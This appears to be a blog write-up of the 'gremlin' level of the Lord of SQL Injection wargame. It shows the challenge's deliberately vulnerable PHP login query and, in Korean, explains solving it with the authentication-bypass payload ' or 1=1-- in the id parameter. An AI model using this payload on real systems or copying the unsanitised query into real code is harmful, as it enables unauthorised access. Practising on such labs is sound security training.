---
layout: post
title:  "los prob_gremlin"
date:   2019-08-10
excerpt: "Lord of Sql Injection"
tag:
- los
- sqli
- wargame
- webhacking
comments: true
---
> query: select id from prob_gremlin where id='' and pw=''

~~~ php
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); // do not try to attack another table, database!
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if($result['id']) solve("gremlin");
  highlight_file(__FILE__);
?>
~~~

# Solve

딱히 필터링이 없으므로 바로 sql injection 구문을 넣으면 된다. 

?id=' or 1=1-- 

실행되는 구문 -> select id from prob_gremlin where id='' or 1=1-- ' and pw=''

## GREMLIN Clear!
